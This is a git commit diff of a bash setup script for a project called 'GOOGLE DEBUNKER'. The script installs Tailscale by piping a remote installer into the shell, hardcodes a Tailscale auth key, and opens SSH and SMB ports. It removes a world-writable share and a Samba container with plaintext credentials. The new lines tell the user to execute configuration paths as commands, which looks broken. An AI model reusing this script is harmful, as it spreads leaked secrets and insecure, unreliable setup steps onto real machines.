fb79107a5a3e989f5e4357d3af0a406f5c656397
Nalawade, Ayan <108238535+Ayan-Nalawade@users.noreply.github.com>
2024-11-22 21:23:06 -0500

    Update install_all.sh

--- install_all.sh
+++ install_all.sh
@@ -1,5 +1,8 @@
 #!/bin/bash
 
+# Display "GOOGLE DEBUNKER" in big font
+echo "GOOGLE DEBUNKER" | figlet
+
 # Install Tailscale
 curl -fsSL https://tailscale.com/install.sh | sh
 sudo tailscale up --auth-key=tskey-auth-kAY3TFtBo221CNTRL-AungQ1fgm6j6PibL8TfB7jyXY9EfHrFF --advertise-exit-node
@@ -22,18 +25,9 @@ sudo ufw allow 22
 sudo ufw allow 6000
 sudo ufw allow 445
 
-# Create storage directory if it doesn't exist
-if [ ! -d "/storage" ]; then
-    sudo mkdir /storage
-    sudo chown -R nobody:nogroup /storage
-    sudo chmod -R 0777 /storage
-fi
-
-cd /etc/default
-tailscaled
-cd /etc/pam.d
-sshd
-
-
-# Run Docker container
-sudo docker run -it -p 445:445 -e "USER=cqqp" -e "PASS=09117518" -v "/home/example:/storage" cqqp/samba
+# Final instructions to run commands
+echo "-------------------------------------------------"
+echo "To complete the setup, run the following commands:"
+echo "  sudo /etc/default/tailscaled"
+echo "  sudo /etc/pam.d/sshd"
+echo "-------------------------------------------------"
